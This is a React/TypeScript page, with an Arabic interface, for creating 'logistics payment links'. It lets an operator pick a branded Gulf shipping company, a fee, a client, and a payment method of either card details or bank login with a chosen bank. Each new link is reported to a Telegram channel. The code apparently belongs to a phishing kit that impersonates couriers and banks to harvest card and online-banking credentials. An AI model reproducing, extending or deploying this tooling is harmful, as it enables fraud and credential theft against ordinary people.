import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getLogisticsServicesByCountry } from "@/lib/gccLogisticsServices";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Truck, DollarSign, Hash, Copy, ExternalLink, CreditCard, User, FileText, Package, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateLogisticsLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getLogisticsServicesByCountry(country?.toUpperCase() || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [shipmentNumber, setShipmentNumber] = useState("");
  const [clientName, setClientName] = useState("");
  const [clientContact, setClientContact] = useState("");
  const [cargoDescription, setCargoDescription] = useState("");
  const [origin, setOrigin] = useState("");
  const [destination, setDestination] = useState("");
  const [serviceNotes, setServiceNotes] = useState("");
  const [feeAmount, setFeeAmount] = useState("1000");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [copied, setCopied] = useState(false);
  
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const serviceBranding = useMemo(() => 
    selectedService ? getServiceBranding(selectedService) : getServiceBranding('warehouse'),
    [selectedService]
  );

  const logisticsTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f5f3ff",
    icon: "🚚"
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !clientName || !shipmentNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }
    
    try {
      const link = await createLink.mutateAsync({
        type: "logistics",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.nameAr || selectedService,
          shipment_number: shipmentNumber,
          client_name: clientName,
          client_contact: clientContact,
          cargo_description: cargoDescription,
          origin: origin,
          destination: destination,
          service_notes: serviceNotes,
          fee_amount: parseFloat(feeAmount) || 1000,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
          category: selectedServiceData?.category || "general",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA',
        serviceType: 'logistics'
      });

      await sendToTelegram({
        type: 'logistics_link_created',
        data: {
          shipment_number: shipmentNumber,
          service_name: selectedServiceData?.nameAr || selectedService,
          client_name: clientName,
          cargo_description: cargoDescription,
          fee_amount: parseFloat(feeAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
        },
        timestamp: new Date().toISOString(),
      });

      setCreatedPaymentUrl(paymentUrl);
      setShowSuccessDialog(true);
      
      toast({
        title: "تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء الرابط",
        variant: "destructive",
      });
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl" style={{ background: logisticsTheme.bgLight }}>
        <div className="text-center p-8">
          <Truck className="w-16 h-16 mx-auto mb-4" style={{ color: logisticsTheme.primary }} />
          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')} style={{ background: logisticsTheme.gradient }}>
            العودة للخدمات
          </Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4" dir="rtl" style={{ background: `linear-gradient(to bottom, ${logisticsTheme.bgLight}, white)` }}>
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-xl border-2" style={{ borderColor: `${logisticsTheme.primary}20` }}>
            <div
              className="h-20 -m-4 mb-4 rounded-t-xl relative overflow-hidden"
              style={{ background: logisticsTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex items-center justify-between px-6">
                <div className="text-white">
                  <div className="flex items-center gap-2 mb-1">
                    <Truck className="w-6 h-6" />
                    <h1 className="text-xl font-bold">الخدمات اللوجستية</h1>
                  </div>
                  <p className="text-sm opacity-90">إنشاء رابط دفع للخدمات اللوجستية - {countryData.nameAr}</p>
                </div>
                <div className="text-4xl">📦</div>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm font-semibold" style={{ color: logisticsTheme.primary }}>
                  نوع الخدمة اللوجستية *
                </Label>
                <Select value={selectedService} onValueChange={(val) => {
                  setSelectedService(val);
                  const service = services.find(s => s.key === val);
                  if (service?.estimatedCost) {
                    setFeeAmount(service.estimatedCost.toString());
                  }
                }}>
                  <SelectTrigger className="h-11 border-2" style={{ borderColor: `${logisticsTheme.primary}30` }}>
                    <SelectValue placeholder="اختر الخدمة اللوجستية" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        <div className="flex items-center gap-2">
                          <Package className="w-4 h-4" style={{ color: logisticsTheme.primary }} />
                          <span>{service.nameAr}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Description */}
              {selectedService && selectedServiceData && (
                <div className="p-3 rounded-lg border-2" style={{ 
                  borderColor: `${logisticsTheme.primary}30`,
                  background: logisticsTheme.bgLight 
                }}>
                  <div className="flex items-center gap-2 mb-2">
                    <Truck className="w-4 h-4" style={{ color: logisticsTheme.primary }} />
                    <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
                  </div>
                  {selectedServiceData.description && (
                    <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                  )}
                  {selectedServiceData.estimatedCost && (
                    <p className="text-xs font-semibold mt-2" style={{ color: logisticsTheme.primary }}>
                      💰 التكلفة التقديرية: {formatCurrency(selectedServiceData.estimatedCost, country || "SA")}
                    </p>
                  )}
                </div>
              )}
              
              {/* Shipment Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  رقم الشحنة أو الطلب *
                </Label>
                <Input
                  value={shipmentNumber}
                  onChange={(e) => setShipmentNumber(e.target.value)}
                  placeholder="مثال: SHIP-2024-001"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                  required
                />
              </div>

              {/* Client Name */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  اسم العميل *
                </Label>
                <Input
                  value={clientName}
                  onChange={(e) => setClientName(e.target.value)}
                  placeholder="اسم العميل أو الشركة"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                  required
                />
              </div>

              {/* Client Contact */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  رقم الاتصال
                </Label>
                <Input
                  value={clientContact}
                  onChange={(e) => setClientContact(e.target.value)}
                  placeholder="رقم الجوال أو البريد الإلكتروني"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                />
              </div>

              {/* Cargo Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  وصف البضاعة
                </Label>
                <Input
                  value={cargoDescription}
                  onChange={(e) => setCargoDescription(e.target.value)}
                  placeholder="نوع البضاعة أو المنتجات"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                />
              </div>

              {/* Origin & Destination */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label className="mb-2 text-sm">نقطة الانطلاق</Label>
                  <Input
                    value={origin}
                    onChange={(e) => setOrigin(e.target.value)}
                    placeholder="المدينة/المنطقة"
                    className="h-10 text-sm border-2"
                    style={{ borderColor: `${logisticsTheme.primary}20` }}
                  />
                </div>
                <div>
                  <Label className="mb-2 text-sm">الوجهة</Label>
                  <Input
                    value={destination}
                    onChange={(e) => setDestination(e.target.value)}
                    placeholder="المدينة/المنطقة"
                    className="h-10 text-sm border-2"
                    style={{ borderColor: `${logisticsTheme.primary}20` }}
                  />
                </div>
              </div>
              
              {/* Service Notes */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  ملاحظات إضافية
                </Label>
                <Textarea
                  value={serviceNotes}
                  onChange={(e) => setServiceNotes(e.target.value)}
                  placeholder="أي تعليمات أو ملاحظات خاصة"
                  className="text-sm min-h-[80px] border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                />
              </div>
              
              {/* Fee Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  تكلفة الخدمة
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={feeAmount}
                  onChange={(e) => setFeeAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-10 text-sm font-semibold border-2"
                  style={{ borderColor: `${logisticsTheme.primary}20` }}
                  step="0.01"
                  min="0"
                />
              </div>
              
              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10 border-2" style={{ borderColor: `${logisticsTheme.primary}30` }}>
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              {/* Bank Selection */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" style={{ color: logisticsTheme.primary }} />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10 border-2" style={{ borderColor: `${logisticsTheme.primary}30` }}>
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          {bank.nameAr}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-6 text-base font-bold shadow-lg"
                style={{ background: logisticsTheme.gradient }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span>جاري الإنشاء...</span>
                ) : (
                  <>
                    <Truck className="w-5 h-5 ml-2" />
                    <span>إنشاء رابط الدفع اللوجستي</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md border-2" style={{ borderColor: logisticsTheme.primary }} dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center flex items-center justify-center gap-2">
              <Truck className="w-6 h-6" style={{ color: logisticsTheme.primary }} />
              <span>تم إنشاء رابط الدفع اللوجستي!</span>
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            <div className="p-4 rounded-lg mb-4 space-y-2" style={{ background: logisticsTheme.bgLight }}>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{selectedServiceData?.nameAr}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{shipmentNumber}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">العميل:</span>
                <span className="font-semibold">{clientName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">التكلفة:</span>
                <span className="font-semibold" style={{ color: logisticsTheme.primary }}>
                  {formatCurrency(parseFloat(feeAmount) || 1000, country || "SA")}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
                style={{ borderColor: logisticsTheme.primary, color: logisticsTheme.primary }}
              >
                <Copy className="w-4 h-4 ml-2" />
                {copied ? "تم النسخ!" : "نسخ الرابط"}
              </Button>

              <Button
                onClick={handlePreview}
                className="flex-1"
                style={{ background: logisticsTheme.gradient }}
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateLogisticsLink;
